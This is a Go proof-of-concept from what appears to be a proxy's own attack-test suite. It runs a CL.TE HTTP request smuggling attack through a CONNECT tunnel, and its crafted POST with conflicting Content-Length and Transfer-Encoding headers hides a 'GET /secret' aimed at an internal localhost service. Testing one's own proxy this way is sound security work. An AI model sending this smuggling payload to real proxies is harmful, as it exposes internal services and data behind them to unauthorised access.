package main

import (
	"fmt"
	"log"
	"strings"

	"oktopus/attack-and-tests/poclib"
)

func cmdRun(args []string) int {
	log.SetFlags(0)
	o, err := parseFlags(args)
	if err != nil {
		return 2
	}
	ok, err := runAttack(o)
	if err != nil {
		return 1
	}
	if ok {
		return 1
	}
	return 0
}

func runAttack(o poclib.RunOpts) (bool, error) {
	if o.ConnectMode == "tunnel" {
		log.Println("bypass: smuggling — только MITM")
		return false, nil
	}
	pool, err := poclib.LoadCAForMode(o.CAFile, o.ConnectMode)
	if err != nil {
		return false, err
	}

	log.Println("=== bypass: CL.TE smuggle GET /secret на internal ===")
	raw, br, _, err := poclib.DialCONNECT(o.ProxyAddr, "localhost:9443", o.ProxyUser, o.ProxyPass)
	if err != nil {
		return false, nil
	}
	defer raw.Close()
	tlsConn, err := poclib.TLSOverCONNECT(raw, br, o.ConnectMode, "localhost", pool)
	if err != nil {
		return false, nil
	}

	// Front request + smuggled backend-style request (probe парсера прокси).
	smuggled := "GET /secret HTTP/1.1\r\nHost: 127.0.0.1:9555\r\nConnection: close\r\n\r\n"
	payload := fmt.Sprintf(
		"POST / HTTP/1.1\r\nHost: localhost\r\nContent-Length: %d\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n%x\r\n%s\r\n0\r\n\r\n",
		len(smuggled)+8, len(smuggled), smuggled,
	)
	st, body, err := poclib.SendRawHTTPAndRead(tlsConn, payload)
	if err != nil {
		log.Printf("read: %v", err)
	}
	poclib.LogBypassResponse(st, body)
	if strings.Contains(body, poclib.SecretMarker) {
		return true, nil
	}
	// Дополнительно читаем возможный второй ответ на том же соединении.
	st2, body2, _ := poclib.ReadHTTPResponse(tlsConn)
	if strings.Contains(body2, poclib.SecretMarker) {
		log.Printf("bypass: второй ответ HTTP %d", st2)
		return true, nil
	}
	return false, nil
}
